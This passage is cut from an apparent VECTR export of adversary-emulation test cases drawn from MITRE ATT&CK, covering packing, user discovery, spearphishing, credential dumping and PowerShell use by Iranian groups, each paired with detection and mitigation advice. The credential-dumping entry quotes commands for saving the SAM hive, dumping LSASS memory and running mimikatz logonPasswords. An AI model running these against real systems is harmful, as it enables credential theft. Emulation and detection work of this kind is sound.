https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Kafka, F. (2018, January). ESET's Guide to Deobfuscating and Devirtualizing FinFisher. Retrieved August 12, 2019. https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf"],"mitreId":"T1045"},"blueTeam":{"successfulDetectionBehaviors":["Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Use signatures or heuristics to detect malicious software."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e1e76bbe-c4b2-4738-8f20-d55c9c0850b0","vectrId":"e1e76bbe-c4b2-4738-8f20-d55c9c0850b0","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"e1e76bbe-c4b2-4738-8f20-d55c9c0850b0","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Owner/User Discovery","variant":"APT39 - System Owner/User Discovery","objective":"### Windows\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Mac\n\nOn Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.\n\n### Linux\n\nOn Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.","command":"[APT39](https://attack.mitre.org/groups/G0087) used [Remexi](https://attack.mitre.org/software/S0375) to collect usernames from the system.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104","relationship--439344c5-67e0-4d38-9b91-866392e5e232","relationship--f1000a93-e87d-4acf-b71d-73c3bb05fd75","course-of-action--16f144e4-c780-4ed2-98b4-55d14e2dfa44","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Symantec Security Response. (2015, December 7). Iran-based attackers use back door threats to spy on Middle Eastern targets. Retrieved April 17, 2019. https://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets"],"mitreId":"T1033"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e20255b6-a143-4dea-949a-739438dc8e5b","vectrId":"e20255b6-a143-4dea-949a-739438dc8e5b","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"e20255b6-a143-4dea-949a-739438dc8e5b","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing Attachment","variant":"Magic Hound - Spearphishing Attachment","objective":"Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) sent malicious attachments to victims over email, including an Excel spreadsheet containing macros to download Pupy.Block unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n---\nUsers can be trained to identify social engineering techniques and spearphishing emails.\n---\nAnti-virus can also automatically quarantine suspicious files.\n---\nNetwork intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38","relationship--d36e441f-3455-4373-a1e9-be28f3d50c76","relationship--87b35c42-a798-461b-a58e-2e2d9ea45354","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--116249f4-b71c-409e-ad9d-7d59d1297d69","course-of-action--8f6b5ca6-263a-4ea9-98f3-afd2a3cd8119","relationship--ce68b332-ac44-472e-81b9-6cffe7ff11a2","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--0bb376d8-f73c-404f-a1bc-9a89c6b7a435","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","relationship--2efc4972-6779-4a5c-a18a-db3c64623b8c","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Counter Threat Unit Research Team. (2017, July 27). The Curious Case of Mia Ash: Fake Persona Lures Middle Eastern Targets. Retrieved February 26, 2018. https://www.secureworks.com/research/the-curious-case-of-mia-ash"],"mitreId":"T1193"},"blueTeam":{"successfulDetectionBehaviors":["Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nBlock unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nBecause this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails. To prevent the attachments from executing, application whitelisting can be used. Anti-virus can also automatically quarantine suspicious files.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Use signatures or heuristics to detect malicious software.","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e3cdbff7-e262-4eb2-bff1-74045eccff11","vectrId":"e3cdbff7-e262-4eb2-bff1-74045eccff11","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"e3cdbff7-e262-4eb2-bff1-74045eccff11","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credential Dumping","variant":"MuddyWater - Credential Dumping - LaZagne - Mimikatz","objective":"Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\n### Windows\n\n#### SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n#### Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n \nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n#### Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s * .xml\n\n#### Service Principal Names (SPNs)\n\nSee [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n\n#### Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can be used to enumerate credentials:\n\n* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n#### DCSync\n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n### Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.\n---\n[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has performed credential dumping with [Mimikatz](https://attack.mitre.org/software/S0002), [LaZagne](https://attack.mitre.org/software/S0349), and other tools, including by dumping passwords saved in victim web browsers and email.\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.\n---\nWindows:\nDo not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.\n\nLinux:\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory.\n---\nLimit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.\n---\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication.\n---\nEnsure that local administrator accounts have complex, unique passwords across all systems on the network.\n---\n\nConsider disabling or restricting NTLM.\n---\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping.\n---\n[LaZagne](https://attack.mitre.org/software/S0349) can perform credential dumping to obtain account and password information.\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["c32562cb-348d-4d0e-85d3-52e2118459d7","3883d65a-3ad2-4111-92fa-19a5d39a119d"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22","relationship--beda360a-6477-48b9-b7d1-4643d02bc3c9","relationship--a6f27258-cf6a-4d75-a3f0-5de085d528d2","course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1","relationship--a266294c-18a7-4a6e-8291-a901748c929c","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--ef79ec2f-fd7f-4f0b-851c-d215693987be","course-of-action--aeff5887-8f9e-48d5-a523-9b395e2ce80a","relationship--7e8ca453-aee5-48c1-a891-f44a742a95ed","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--fc31837d-530f-45e5-b9f8-bf6268c3ef03","course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462","relationship--7a3426bf-1751-43db-b844-6bf388a4c817","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","relationship--fe849763-78b9-4b8a-9219-2781ac7b00e8","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--ee8ef62a-fcde-44b0-aa63-4028dad703aa","course-of-action--49c06d54-9002-491d-9147-8efb537fbd26","tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b","relationship--43619944-94e9-43d9-a761-8e4db2113eef","tool--afc079f3-c0ea-4096-b75d-3f05338b7f60","relationship--b7930db8-2cb9-4ecf-b3d3-7425f99140d8","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["(Citation: GitHub LaZange Dec 2018)","Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018. https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html","Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015. https://github.com/gentilkiwi/mimikatz","Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017. https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump","Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018. https://github.com/Neohapsis/creddump7","Frecn, D.. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019. https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea","Grafnetter, M. (2015, October 26). Retrieving DPAPI Backup Keys from Active Directory. Retrieved December 19, 2017. https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/","Lancaster, T.. (2017, November 14). Muddying the Water: Targeted Attacks in the Middle East. Retrieved March 15, 2018. https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/","Lich, B. (2016, May 31). Protect derived domain credentials with Credential Guard. Retrieved June 1, 2016. https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard","Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015. https://adsecurity.org/?page_id=1821","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017. https://adsecurity.org/?p=1729","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017. https://adsecurity.org/?p=1729","Microsoft. (2008, July 25). Credential Security Service Provider and SSO for Terminal Services Logon. Retrieved April 11, 2018. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749211(v=ws.10)","Microsoft. (2012, November 29). Using security policies to restrict NTLM traffic. Retrieved December 4, 2017. https://technet.microsoft.com/library/jj865668.aspx","Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved February 13, 2015. https://technet.microsoft.com/en-us/library/dn408187.aspx","Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc228086.aspx","Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017. https://msdn.microsoft.com/library/cc237008.aspx","Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018. https://msdn.microsoft.com/library/cc422924.aspx","Microsoft. (n.d.). How to grant the \"Replicating Directory Changes\" permission for the Microsoft Metadirectory Services ADMA service account. Retrieved December 4, 2017. https://support.microsoft.com/help/303972/how-to-grant-the-replicating-directory-changes-permission-for-the-micr","Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017. https://msdn.microsoft.com/library/dd207691.aspx","Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc245496.aspx","NSA IAD. (2017, April 20). Secure Host Baseline - Credential Guard. Retrieved April 25, 2017. https://github.com/iadgov/Secure-Host-Baseline/tree/master/Credential%20Guard","Plett, C., Poggemeyer, L. (12, October 26). Securing Privileged Access Reference Material. Retrieved April 25, 2017. https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017. https://wiki.samba.org/index.php/DRSUAPI","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015. http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx","Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017. https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM","Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018. https://en.wikipedia.org/wiki/Active_Directory","Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018. https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/","Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017. https://source.winehq.org/WineAPI/samlib.html","Zanni, A. (n.d.). The LaZagne Project !!!. Retrieved December 14, 2018. https://github.com/AlessandroZ/LaZagne"],"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":["Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","### Windows\nMonitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [Valid Accounts](https://attack.mitre.org/techniques/T1078) if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access)\n\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA. (Citation: Microsoft LSA)\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. (Citation: TechNet Credential Guard) It also does not protect against all forms of credential dumping. (Citation: GitHub SHB Credential Guard)\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication. (Citation: AdSecurity DCSync Sept 2015) (Citation: Microsoft Replication ACL)\n\nConsider disabling or restricting NTLM traffic. (Citation: Microsoft Disable NTLM Nov 2012)\n\n### Linux\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to escalated privileges to avoid hostile programs from accessing such sensitive regions of memory.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc.","Set and enforce secure password policies for accounts.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e3ee3c9e-9650-499b-b3b5-8861b5a31c23","vectrId":"e3ee3c9e-9650-499b-b3b5-8861b5a31c23","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"e3ee3c9e-9650-499b-b3b5-8861b5a31c23","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"PowerShell","variant":"Magic Hound - PowerShell - Pupy","objective":"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be 